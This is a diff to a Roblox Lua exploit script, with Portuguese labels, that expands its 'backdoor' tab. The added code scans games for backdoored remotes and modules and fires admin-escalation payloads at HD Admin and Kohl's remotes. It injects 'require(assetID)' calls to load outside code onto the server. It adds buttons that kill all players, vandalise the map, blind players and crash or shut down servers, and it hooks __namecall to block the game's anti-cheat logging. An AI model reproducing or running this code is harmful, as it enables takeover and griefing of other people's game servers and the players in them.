@@ -1,5 +1,3 @@
-
-
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
@@ -9,6 +7,8 @@ local Workspace = game:GetService("Workspace")
 local TextChatService = game:GetService("TextChatService")
 local CoreGui = game:GetService("CoreGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local JointsService = game:GetService("JointsService") -- Added for Scan scope
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
@@ -98,6 +98,7 @@ local BackdoorResults = {}
 local BackdoorSpamming = false
 local LogConsole = nil -- Variável global para função de log do console
 local SelectedBackdoor = nil -- Armazena o remoto selecionado para exploração
+local ExternalAssetID = "" -- Variável para Asset ID externo
 
 --// LOADER VARIABLES
 local MenuToggleKey = Enum.KeyCode.Insert
@@ -1191,7 +1192,7 @@ function UI:CreateWindow(Name)
             table.insert(ThemeObjects.Texts, Label)
 
             local Input = Instance.new("TextBox")
-            Input.Text = configTable[configKey]
+            Input.Text = configTable[configKey] or "" -- Fix nil value
             Input.Font = Enum.Font.Gotham
             Input.TextSize = 13
             Input.TextColor3 = Color3.fromRGB(200,200,200)
@@ -1554,14 +1555,16 @@ local function ToggleInvisible(state)
     end
 end
 
---// BACKDOOR FUNCTIONS (SYSTEM UTILS V4 REVISED)
--- Classificação de Vulnerabilidades e Banco de Dados de Assinaturas
+--// BACKDOOR FUNCTIONS (SYSTEM UTILS V5 REVISED)
+-- Classificação de Vulnerabilidades e Banco de Dados de Assinaturas (Atualizado VDB)
 local KnownSignatures = {
-    CRITICO = { -- Loadstring RCE
-        "loadstring", "exec", "run", "code", "eval", "compile", "bytecode", "load"
+    CRITICO = { -- Infecções Reais & RCE
+        "ilIlIlIl", "IIlI", "M6", "xeon", "redboy", "oppresser", "shady", "backdoor", "Bacon", "Curly", "NS", 
+        "Myuu", "TopK3K", "RedBoy" -- Added requested model signatures
     },
     ALTO = { -- Admin Abuse / Require
-        "admin", "ban", "kick", "system", "command", "cmd", "control", "root", "require", "module", "asset", "hdadmin"
+        "admin", "ban", "kick", "system", "command", "cmd", "control", "root", "require", "module", "asset", "hdadmin", 
+        "MainModule", "External Asset Fetcher", "Infection", "Glitch", "Memes" -- Added ModuleScript signatures
     },
     MEDIO = { -- Remote Spam / Info Leak
         "test", "debug", "remote", "event", "server", "check", "verify", "log", "print"
@@ -1573,8 +1576,8 @@ local KnownSignatures = {
 
 -- Mapeamento de Remotos Vulneráveis Conhecidos (Specific Exploits)
 local KnownVulnerableRemotes = {
-    ["HDAdminRemote"] = {Type = "Admin", Method = "FireServer", Args = {"SetRank", LocalPlayer.UserId, 5}},
-    ["HDAdminClient"] = {Type = "Admin", Method = "FireServer", Args = {"SetRank", LocalPlayer.UserId, 5}},
+    ["HDAdminRemote"] = {Type = "Admin", Method = "FireServer", Args = {"SetRank", LocalPlayer.UserId, 999}},
+    ["HDAdminClient"] = {Type = "Admin", Method = "FireServer", Args = {"SetRank", LocalPlayer.UserId, 999}},
     ["Adonis_Client_Remote"] = {Type = "Admin", Method = "FireServer", Args = {"Execute", "LocalPlayer", "Kill", "All"}},
     ["Kohl's Admin Remote"] = {Type = "Admin", Method = "FireServer", Args = {"admin", LocalPlayer.Name}},
     ["Admin"] = {Type = "RCE", Method = "FireServer", Args = {"print('Admin Remote Found')"}},
@@ -1646,7 +1649,7 @@ local Payloads = {
 }
 
 local function ScanForBackdoorsV4()
-    if LogConsole then LogConsole("--- INICIANDO SCAN COMPLETO ---", Color3.fromRGB(0, 255, 255)) end
+    if LogConsole then LogConsole("--- INICIANDO SCAN HÍBRIDO (REMOTE & MODULE) ---", Color3.fromRGB(0, 255, 255)) end
     table.clear(BackdoorResults)
     local found = 0
     
@@ -1661,16 +1664,21 @@ local function ScanForBackdoorsV4()
             score = "CRITICO"
             description = "Vulnerabilidade Conhecida: " .. KnownVulnerableRemotes[name].Type
         else
-            -- Análise heurística
-            for level, keywords in pairs(KnownSignatures) do
-                for _, kw in pairs(keywords) do
-                    if lowerName:find(kw) then
-                        score = level
-                        description = "Possível " .. kw:upper() .. " vulnerability"
-                        break
+            -- Análise heurística (VDB Expansion Check)
+            if lowerName:find("xhz_") or lowerName:find("\0") then -- Hidden chars check
+                 score = "ALTO"
+                 description = "Padrao de nome suspeito (Obfuscated)"
+            else
+                for level, keywords in pairs(KnownSignatures) do
+                    for _, kw in pairs(keywords) do
+                        if lowerName:find(kw:lower()) then
+                            score = level
+                            description = "Possível " .. kw:upper() .. " vulnerability"
+                            break
+                        end
                     end
+                    if score ~= "SAFE" then break end
                 end
-                if score ~= "SAFE" then break end
             end
         end
         
@@ -1683,24 +1691,52 @@ local function ScanForBackdoorsV4()
         
         -- Adiciona TODOS os remotes para visualização se a opção estiver ativada, ou se for vulnerável
         if score ~= "SAFE" or Config.Backdoor.ShowSafe then
-            if LogConsole then 
-                LogConsole(string.format("[SCAN] Encontrado: %s | Risco: %s", remote.Name, score), logColor)
+            if LogConsole and score ~= "SAFE" then 
+                LogConsole(string.format("[SCAN REMOTE] Encontrado: %s | Risco: %s", remote.Name, score), logColor)
             end
             table.insert(BackdoorResults, {
                 Instance = remote,
                 Risk = score,
                 Desc = description,
-                Path = remote:GetFullName()
+                Path = remote:GetFullName(),
+                Type = "Remote"
             })
             if score ~= "SAFE" then found = found + 1 end
         end
     end
-
-    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then analyze(v) end
+    
+    -- New Module Scanning Logic (Critical Update)
+    local function scanModules(parent)
+        for _, v in pairs(parent:GetDescendants()) do
+            if v:IsA("ModuleScript") then
+                 local n = v.Name:lower()
+                 local isSuspicious = false
+                 for _, kw in pairs(KnownSignatures.ALTO) do
+                     if n:find(kw:lower()) then isSuspicious = true break end
+                 end
+                 
+                 if isSuspicious then
+                     if LogConsole then LogConsole("[SCAN MODULE] VETOR DE ATAQUE DE REQUIRE: " .. v.Name, Color3.fromRGB(255, 100, 0)) end
+                     table.insert(BackdoorResults, {
+                        Instance = v,
+                        Risk = "ALTO",
+                        Desc = "VETOR DE ATAQUE DE REQUIRE",
+                        Path = v:GetFullName(),
+                        Type = "Module"
+                     })
+                     found = found + 1
+                 end
+            end
+        end
     end
-    for _, v in pairs(Workspace:GetDescendants()) do
-        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then analyze(v) end
+
+    -- Escopo Expandido (Hybrid Scanner)
+    local scopes = {ReplicatedStorage, Workspace, Lighting, ReplicatedFirst, JointsService}
+    for _, scope in pairs(scopes) do
+        for _, v in pairs(scope:GetDescendants()) do
+             if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then analyze(v) end
+        end
+        scanModules(scope)
     end
     
     table.sort(BackdoorResults, function(a,b)
@@ -1749,10 +1785,30 @@ local function AttemptBackdoorExec(code, specificRemote)
              if LogConsole then LogConsole("[TRY 6] Player Spoof...", Color3.fromRGB(255, 200, 100)) end
              if remote:IsA("RemoteEvent") then remote:FireServer(LocalPlayer, payload)
              elseif remote:IsA("RemoteFunction") then remote:InvokeServer(LocalPlayer, payload) end
+        end,
+        function(remote, payload) -- Tática 7: Require Asset ID Injection (REQUESTED UPDATE)
+             local id = tonumber(payload)
+             if id then
+                 if LogConsole then LogConsole("[TRY 7] Require ID Injection...", Color3.fromRGB(255, 200, 100)) end
+                 -- Numeric Direct
+                 if remote:IsA("RemoteEvent") then remote:FireServer(id)
+                 elseif remote:IsA("RemoteFunction") then remote:InvokeServer(id) end
+                 
+                 -- String Wrapper "require(ID)"
+                 local reqStr = "require("..id..")"
+                 if remote:IsA("RemoteEvent") then remote:FireServer(reqStr)
+                 elseif remote:IsA("RemoteFunction") then remote:InvokeServer(reqStr) end
+             end
         end
     }
 
     local function run_strategies(remote, payload)
+        if not remote or not remote.Parent then return end
+        if remote:IsA("ModuleScript") then
+             if LogConsole then LogConsole("[INFO] ModuleScript não pode ser executado diretamente pelo client.", Color3.fromRGB(255, 100, 100)) end
+             return
+        end
+
         if LogConsole then LogConsole("[HOOK] Iniciando Ataque Sequencial em: " .. remote.Name, Color3.fromRGB(255, 50, 50)) end
         
         -- Se for conhecido, usa apenas o método específico
@@ -1771,6 +1827,12 @@ local function AttemptBackdoorExec(code, specificRemote)
                 pcall(function() strategy(remote, payload) end)
                 task.wait(0.3) -- Pequeno delay entre tentativas para não kickar por spam instantâneo
             end
+            
+            -- DIAGNOSTICO VISUAL (Step 5)
+            pcall(function()
+                if remote:IsA("RemoteEvent") then remote:FireServer("Instance.new('Message',workspace).Text='Nomade Success'") end
+            end)
+            
             if LogConsole then LogConsole("[INFO] Ciclo de ataques finalizado.", Color3.fromRGB(100, 100, 255)) end
         end)
     end
@@ -1780,7 +1842,7 @@ local function AttemptBackdoorExec(code, specificRemote)
     else
         if #BackdoorResults == 0 then ScanForBackdoorsV4() end
         for _, res in pairs(BackdoorResults) do
-            if res.Risk ~= "SAFE" then
+            if res.Risk ~= "SAFE" and res.Type == "Remote" then
                 run_strategies(res.Instance, code)
             end
         end
@@ -2601,7 +2663,7 @@ local function StartNomade()
     GlobalTab:Toggle("Vida Infinita (Loop)", Config.Global, "LoopHealth", nil, true)
 
     local BackdoorTab = Menu:Tab("BACKDOOR")
-    BackdoorTab:Section("CONSOLE DE DIAGNÓSTICO (CMD)")
+    BackdoorTab:Section("INTERFACE DE DIAGNÓSTICO PROFISSIONAL")
     
     local CMDFrame = Instance.new("Frame")
     CMDFrame.Size = UDim2.new(1, -10, 0, 120)
@@ -2666,13 +2728,10 @@ local function StartNomade()
         if LogConsole then LogConsole("Sistema de Backdoor Pronto...", Color3.fromRGB(100, 255, 100)) end
     end)
 
-    BackdoorTab:Section("SCANNER DE VULNERABILIDADE V4")
+    BackdoorTab:Section("SCANNER HÍBRIDO (REMOTE & MODULE)")
     
     BackdoorTab:Toggle("Mostrar Todos (Safe Remotes)", Config.Backdoor, "ShowSafe", function()
         -- Atualiza se já houver resultados
-        if #BackdoorResults > 0 then
-             -- Recalcular apenas se necessário, mas aqui deixaremos o botão de scan fazer o trabalho
-        end
     end)
     
     -- Resultados Container
@@ -2705,7 +2764,7 @@ local function StartNomade()
     ActionCorner.Parent = ActionPanel
     
     local ActionLabel = Instance.new("TextLabel")
-    ActionLabel.Text = "AÇÕES DO REMOTO SELECIONADO:"
+    ActionLabel.Text = "MOTOR DE INJEÇÃO INTELIGENTE:"
     ActionLabel.Font = Enum.Font.GothamBold
     ActionLabel.TextSize = 12
     ActionLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
@@ -2774,9 +2833,37 @@ local function StartNomade()
     ActionGrid.Parent = ActionScroll
     
     -- Add Buttons to Action Panel (Scrollable)
-    CreateActionButton("Testar Conexão (Ping)", function(remote) 
-        AttemptBackdoorExec("print('Ping Test')", remote)
-        SendNotification("Action", "Ping enviado para " .. remote.Name, 2)
+    CreateActionButton("SMART INJECT (AUTO)", function(remote) 
+        -- Smart Logic
+        if remote:IsA("ModuleScript") then
+             SendNotification("Smart Inject", "Alvo é Module. Tente 'Force Require' com um Remote vulnerável.", 3)
+        else
+            SendNotification("Smart Inject", "Testando Admin e RCE...", 2)
+            -- Admin Payload
+            AttemptBackdoorExec(Payloads.ForceAdmin, remote)
+            -- RCE Basic
+            AttemptBackdoorExec("print('Smart Inject Success')", remote)
+        end
+    end, ActionScroll)
+
+    CreateActionButton("Get Admin (HD/Kohl's)", function(remote)
+        -- Tenta usar config específica se existir
+        if KnownVulnerableRemotes[remote.Name] and KnownVulnerableRemotes[remote.Name].Type == "Admin" then
+            local data = KnownVulnerableRemotes[remote.Name]
+            if remote:IsA("RemoteEvent") then remote:FireServer(unpack(data.Args))
+            elseif remote:IsA("RemoteFunction") then remote:InvokeServer(unpack(data.Args)) end
+            SendNotification("Admin", "Payload específico enviado!", 2)
+        else
+            -- Se não, tenta força bruta com configs de admin conhecidas
+            SendNotification("Admin", "Tentando injeção forçada (All Types)...", 2)
+            for _, data in pairs(KnownVulnerableRemotes) do
+                if data.Type == "Admin" then
+                    if remote:IsA("RemoteEvent") then pcall(function() remote:FireServer(unpack(data.Args)) end)
+                    elseif remote:IsA("RemoteFunction") then pcall(function() remote:InvokeServer(unpack(data.Args)) end) end
+                    task.wait(0.1)
+                end
+            end
+        end
     end, ActionScroll)
     
     CreateActionButton("Kick All Players", function(remote)
@@ -2784,9 +2871,10 @@ local function StartNomade()
         SendNotification("Action", "Tentando expulsar todos...", 2)
     end, ActionScroll)
     
-    CreateActionButton("Grant Me Admin (Force)", function(remote)
-        AttemptBackdoorExec(Payloads.ForceAdmin, remote)
-        SendNotification("Action", "Injetando admin via " .. remote.Name, 2)
+    CreateActionButton("Force Require (AssetID)", function(remote)
+        if ExternalAssetID == "" then SendNotification("Erro", "Defina um Asset ID abaixo!", 2) return end
+        AttemptBackdoorExec(ExternalAssetID, remote) -- Strategy 7 handles ID requiring
+        SendNotification("Require", "Tentando require("..ExternalAssetID..")", 2)
     end, ActionScroll)
 
     CreateActionButton("Spam This Remote", function(remote)
@@ -2818,7 +2906,6 @@ local function StartNomade()
          SendNotification("Action", "Enviando loop infinito...", 2)
     end, ActionScroll)
     
-    -- NOVAS FUNÇÕES ADICIONADAS
     CreateActionButton("Shutdown Server", function(remote)
         AttemptBackdoorExec("game:Shutdown()", remote)
         SendNotification("Action", "Enviando comando Shutdown...", 2)
@@ -2860,7 +2947,6 @@ local function StartNomade()
     end, ActionScroll)
     
     CreateActionButton("Give Cash (Generic)", function(remote)
-         -- Tenta nomes comuns de stats
          AttemptBackdoorExec("game.Players.LocalPlayer.leaderstats.Cash.Value = 999999", remote)
          AttemptBackdoorExec("game.Players.LocalPlayer.leaderstats.Money.Value = 999999", remote)
          AttemptBackdoorExec("game.Players.LocalPlayer.leaderstats.Coins.Value = 999999", remote)
@@ -2928,7 +3014,7 @@ local function StartNomade()
             DescLbl.Parent = Item
             
             local RiskLbl = Instance.new("TextLabel")
-            RiskLbl.Text = res.Risk
+            RiskLbl.Text = res.Risk .. " (" .. (res.Type or "Remote") .. ")"
             RiskLbl.Font = Enum.Font.GothamBold
             RiskLbl.TextColor3 = RiskColor
             RiskLbl.TextSize = 11
@@ -2966,7 +3052,7 @@ local function StartNomade()
         ScanResultsContainer.CanvasSize = UDim2.new(0, 0, 0, (#BackdoorResults * 65) + 10)
     end
 
-    BackdoorTab:Button("Escanear Vulnerabilidades (Deep Scan)", function()
+    BackdoorTab:Button("Escanear Vulnerabilidades (Hybrid)", function()
         -- Reset Action Panel
         ActionPanel.Visible = false
         ActionPanel.Size = UDim2.new(1, -10, 0, 0)
@@ -2974,7 +3060,7 @@ local function StartNomade()
         
         local count = ScanForBackdoorsV4()
         UpdateResultsList()
-        SendNotification("Scanner V4", "Análise completa. Encontrados: " .. tostring(count), 4)
+        SendNotification("Scanner V5", "Análise completa. Encontrados: " .. tostring(count), 4)
     end)
     
     -- Inserir o container na UI
@@ -2986,10 +3072,48 @@ local function StartNomade()
     
     ScanResultsContainer.Parent = ContainerFrame
     
-    -- Move ActionPanel to appear AFTER the results container in layout order
-    -- The layout order is determined by insertion order or LayoutOrder property if using UIListLayout
-    -- Since we use manual parenting here, we ensure elements are added in correct sequence in the tab
+    BackdoorTab:Section("FERRAMENTA EXTERNA (REQUIRE ASSET)")
     
+    local ExtFrame = Instance.new("Frame")
+    ExtFrame.Size = UDim2.new(1, -10, 0, 45)
+    ExtFrame.BackgroundColor3 = CurrentTheme.Element
+    ExtFrame.Parent = BackdoorTab.Page
+    table.insert(ThemeObjects.Elements, ExtFrame)
+    local ExtC = Instance.new("UICorner"); ExtC.CornerRadius = UDim.new(0, 6); ExtC.Parent = ExtFrame
+    
+    local AssetInput = Instance.new("TextBox")
+    AssetInput.PlaceholderText = "ID do Asset (ModuleScript)"
+    AssetInput.Text = ""
+    AssetInput.Font = Enum.Font.Gotham
+    AssetInput.TextSize = 13
+    AssetInput.TextColor3 = Color3.fromRGB(200,200,200)
+    AssetInput.BackgroundColor3 = Color3.fromRGB(50,50,55)
+    AssetInput.Size = UDim2.new(0.6, 0, 0, 25)
+    AssetInput.Position = UDim2.new(0.02, 0, 0.5, -12.5)
+    AssetInput.Parent = ExtFrame
+    local AIC = Instance.new("UICorner"); AIC.CornerRadius = UDim.new(0, 4); AIC.Parent = AssetInput
+    
+    AssetInput.FocusLost:Connect(function()
+        ExternalAssetID = AssetInput.Text
+    end)
+    
+    local ForceReqBtn = Instance.new("TextButton")
+    ForceReqBtn.Text = "FORCE REQUIRE"
+    ForceReqBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 50)
+    ForceReqBtn.TextColor3 = Color3.new(1,1,1)
+    ForceReqBtn.Font = Enum.Font.GothamBold
+    ForceReqBtn.TextSize = 11
+    ForceReqBtn.Size = UDim2.new(0.35, 0, 0, 25)
+    ForceReqBtn.Position = UDim2.new(0.63, 0, 0.5, -12.5)
+    ForceReqBtn.Parent = ExtFrame
+    local FRC = Instance.new("UICorner"); FRC.CornerRadius = UDim.new(0, 4); FRC.Parent = ForceReqBtn
+    
+    ForceReqBtn.MouseButton1Click:Connect(function()
+        if ExternalAssetID == "" then SendNotification("Erro", "Insira um ID!", 2) return end
+        SendNotification("Spam Require", "Enviando ID para todos os remotes vulneráveis...", 3)
+        AttemptBackdoorExec(ExternalAssetID) -- Strategy 7
+    end)
+
     BackdoorTab:Section("FERRAMENTAS SS (SERVER-SIDE)")
     BackdoorTab:Button("Force Admin (V2 Advanced)", function()
         SendNotification("Force Admin", "Tentando injeção em HD/Kohl's/BAE...", 3)
@@ -3005,8 +3129,34 @@ local function StartNomade()
     BackdoorTab:Button("Message All (System)", function()
         AttemptBackdoorExec("local m = Instance.new('Message', workspace); m.Text = 'NOMADE ON TOP'; wait(5); m:Destroy()")
     end)
+
+    BackdoorTab:Section("AMBIENTE (VISUAL/AUDIO)")
+    BackdoorTab:Button("Decal Spam (Infect Textures)", function()
+        AttemptBackdoorExec("local id = 'rbxassetid://13476403759'; for _,v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') then local d = Instance.new('Decal',v); d.Texture = id; d.Face = 'Front'; local d2 = d:Clone(); d2.Face = 'Back'; d2.Parent = v; end end")
+        SendNotification("Action", "Texturizando mapa...", 2)
+    end)
+
+    BackdoorTab:Button("Play Audio (Global)", function()
+        AttemptBackdoorExec("local s = Instance.new('Sound', workspace); s.SoundId = 'rbxassetid://130776150'; s.Looped = true; s.Volume = 10; s:Play()")
+        SendNotification("Action", "Tocando áudio...", 2)
+    end)
+
+    BackdoorTab:Button("Fog Blindness (Cegueira)", function()
+        AttemptBackdoorExec("game.Lighting.FogEnd = 0; game.Lighting.FogStart = 0; game.Lighting.ClockTime = 0")
+        SendNotification("Action", "Alterando iluminação...", 2)
+    end)
     
     BackdoorTab:Section("INTERAÇÃO GLOBAL (PHYSICS/PLAYER)")
+    BackdoorTab:Button("Kill All (Break Joints)", function()
+        AttemptBackdoorExec("for _,v in pairs(game.Players:GetPlayers()) do if v.Character then v.Character:BreakJoints() end end")
+        SendNotification("Action", "Eliminando jogadores...", 2)
+    end)
+
+    BackdoorTab:Button("Force Field All (God)", function()
+        AttemptBackdoorExec("for _,v in pairs(game.Players:GetPlayers()) do if v.Character then Instance.new('ForceField', v.Character) end end")
+        SendNotification("Action", "Aplicando ForceField...", 2)
+    end)
+
     BackdoorTab:Button("Unanchor Map (Physics Abuse)", function()
         AttemptBackdoorExec(Payloads.UnanchorMap)
         SendNotification("SS Destroyer", "Tentando soltar peças do mapa...", 2)
@@ -3023,6 +3173,81 @@ local function StartNomade()
     BackdoorTab:Button("Crash Server (Loop - RISCO)", function()
          AttemptBackdoorExec(Payloads.Crash)
     end)
+
+    BackdoorTab:Section("INTERAÇÃO AVANÇADA (KERNEL)")
+    
+    BackdoorTab:Button("Scan Nil Instances (Hidden)", function()
+        if not getnilinstances then SendNotification("Erro", "Exploit não suporta getnilinstances", 2) return end
+        local found = 0
+        for _, v in pairs(getnilinstances()) do
+            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+                local risk = "ALTO"
+                if v.Name:lower():find("admin") or v.Name:lower():find("ban") then risk = "CRITICO" end
+                
+                table.insert(BackdoorResults, {
+                    Instance = v,
+                    Risk = risk,
+                    Desc = "Instância Oculta (Nil Parent)",
+                    Path = "nil",
+                    Type = v.ClassName
+                })
+                found = found + 1
+                if LogConsole then LogConsole("[NIL] Encontrado: " .. v.Name .. " | Risco: " .. risk, Color3.fromRGB(255, 100, 255)) end
+            end
+        end
+        SendNotification("Nil Scan", "Varredura concluída. Encontrados: " .. found, 3)
+    end)
+
+    BackdoorTab:Button("Dump Critical Upvalues", function()
+        if not getgc or not debug.getupvalues then SendNotification("Erro", "Exploit não suporta debug lib", 2) return end
+        local count = 0
+        SendNotification("Debug", "Iniciando varredura na memória...", 2)
+        
+        for _, f in pairs(getgc()) do
+            if type(f) == "function" and islclosure(f) then
+                local ups = debug.getupvalues(f)
+                for i, v in pairs(ups) do
+                    if type(v) == "string" then
+                        local vs = v:lower()
+                        if vs == "admin" or vs == "moderator" or vs == "ban" or vs == "kick" then
+                            if LogConsole then LogConsole("[UPVALUE] String Crítica encontrada: " .. v, Color3.fromRGB(255, 150, 0)) end
+                            count = count + 1
+                        end
+                    elseif type(v) == "number" and v > 100000 then -- Possible Money/Stats
+                         -- if LogConsole then LogConsole("[UPVALUE] Valor Alto: " .. v, Color3.fromRGB(200, 200, 255)) end
+                    end
+                end
+            end
+        end
+        SendNotification("Debug", "Encontrados " .. count .. " upvalues suspeitos.", 2)
+    end)
+
+    BackdoorTab:Toggle("Hook Remote Logs (Anti-Log)", Config.Backdoor, "AntiLog", function(state)
+        if state then
+            if not getrawmetatable then SendNotification("Erro", "Exploit não suporta getrawmetatable", 2) return end
+            
+            local mt = getrawmetatable(game)
+            setreadonly(mt, false)
+            local old = mt.__namecall
+            
+            mt.__namecall = newcclosure(function(self, ...)
+                local method = getnamecallmethod()
+                if method == "FireServer" or method == "InvokeServer" then
+                    local n = self.Name:lower()
+                    if n:find("log") or n:find("check") or n:find("security") or n:find("ban") or n:find("detected") then
+                        if LogConsole then LogConsole("[HOOK] Bloqueado envio para: " .. self.Name, Color3.fromRGB(255, 50, 50)) end
+                        return nil
+                    end
+                end
+                return old(self, ...)
+            end)
+            
+            setreadonly(mt, true)
+            SendNotification("Hook", "Proteção Anti-Log Ativada (Metatable)", 3)
+        else
+            SendNotification("Hook", "Reinicie o script para remover o Hook.", 3)
+        end
+    end, true)
 
     BackdoorTab:Section("EXECUÇÃO REMOTA")
     BackdoorTab:TextBox("SS Payload (Lua Code)", Config.Backdoor, "SSCode")
